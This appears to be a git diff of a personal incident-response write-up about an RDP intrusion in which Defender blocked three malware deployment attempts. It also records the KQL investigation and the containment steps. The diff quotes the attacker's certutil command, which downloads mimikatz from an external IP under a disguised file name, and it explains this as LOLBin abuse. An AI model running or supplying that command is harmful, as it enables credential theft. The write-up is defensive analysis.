@@ -105,6 +105,8 @@ folder and Defender caught it almost immediately.
 
 Defender flagged and prevented it at 9:45 PM. First attempt — blocked.
 
+<img width="776" height="118" alt="image" src="https://github.com/user-attachments/assets/3f590292-828b-4f27-907c-f109bbb4bd9d" />
+
 ---
 
 **Stage 2 — Second download attempt (9:50 PM)**
@@ -122,9 +124,12 @@ Same source, different file.
 Defender quarantined it at 9:52 PM and stopped explorer.exe from 
 even opening it. Second attempt — blocked again.
 
+<img width="736" height="105" alt="image" src="https://github.com/user-attachments/assets/76ef4925-3717-48c7-88cd-2da03cd2c87e" />
+
+
 ---
 
-**Stage 3 — Going manual (10:03 PM)**
+**Stage 3 — Going manual (10:03 PM) RCE Techniques**
 
 At this point the attacker had failed twice and they knew it. 
 So they shifted strategy. Instead of relying on downloaded files 
@@ -137,6 +142,7 @@ Then they ran this command:
 ```
 certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe
 ```
+<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />
 
 I want to break this down because it's clever. `certutil.exe` is 
 a legitimate Windows binary used for certificate management. 
@@ -155,7 +161,7 @@ laterally from there. Defender caught it before any of that
 happened — detected as `Trojan:Win32/Ceprolad.A` and removed 
 at 10:04 PM. Third attempt — blocked.
 
-![KQL investigation showing logon activity and remote session details](screenshots/kql-logon-results.png)
+<img width="1011" height="119" alt="image" src="https://github.com/user-attachments/assets/187100f9-2c0d-4ae3-9d91-458ea71ae4bf" />
 
 ---
 
@@ -215,16 +221,19 @@ URLs, and both the external attacker IP and the C2 IP across
 the environment. I also flagged `10.159.17.126` for a separate 
 investigation as a potentially compromised internal machine.
 
+<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/8332fa12-d517-428c-b997-f468030a7399" />
+
+
 **Eradication**
 
-I ran a full AV scan on the device — came back clean. Then I went 
+I ran a full AV scan on the device, came back clean. Then I went 
 deeper. I queried across `DeviceFileEvents`, `DeviceProcessEvents` 
 and `DeviceNetworkEvents` in KQL to check whether `it_support.exe` 
 had done anything before Defender caught it, and to look for any 
 persistence mechanisms — scheduled tasks, registry run keys, 
 startup folder changes. Found nothing.
 
-![KQL deep dive showing no additional malicious activity found](screenshots/kql-eradication-check.png)
+<img width="1073" height="496" alt="image" src="https://github.com/user-attachments/assets/d5ca758a-ad26-4d88-9590-165014b2e8f1" />
 
 **Recovery**
 
@@ -236,7 +245,7 @@ I put enhanced monitoring on the host and account going forward.
 
 ### How I closed it
 
-> The attacker gained access via RDP — originating externally from 
+> The attacker gained access via RDP originating externally from 
 > `213.152.187.225` and the session was also linked to an internal 
 > machine at `10.159.17.126` which may have been a compromised 
 > pivot point. Three separate attempts to deploy malware were made 
@@ -259,15 +268,13 @@ process event logs as the session initiator. Mixing these up or
 treating them as the same thing would be a significant error in 
 a real incident report.
 
-`10.159.17.126` being an internal IP also means this wasn't just 
-one machine at risk. If that device was compromised and used as a 
-hop point, it needed its own full investigation — which I flagged 
-but is worth calling out as a gap in the initial scope.
-
 I also noted that certutil LOLBin abuse shouldn't rely solely 
 on Defender to catch it downstream. There should be a dedicated 
 detection rule that fires the moment certutil is called with 
 `-urlcache`. That's a detection coverage gap worth addressing.
+
+
+<img width="1300" height="532" alt="image" src="https://github.com/user-attachments/assets/ed58fcbb-27d3-4557-b76d-6daf9379938d" />
 
 ---
 
@@ -288,19 +295,6 @@ detection rule that fires the moment certutil is called with
 
 ---
 
-## Folder structure
-
-```
-case-01-human-operated-malware/
-├── screenshots/
-│   ├── kql-logon-query.png
-│   ├── kql-logon-results.png
-│   └── kql-eradication-check.png
-├── incident-report.docx
-└── notes.md
-```
-
----
 
 ## Tools I used
 
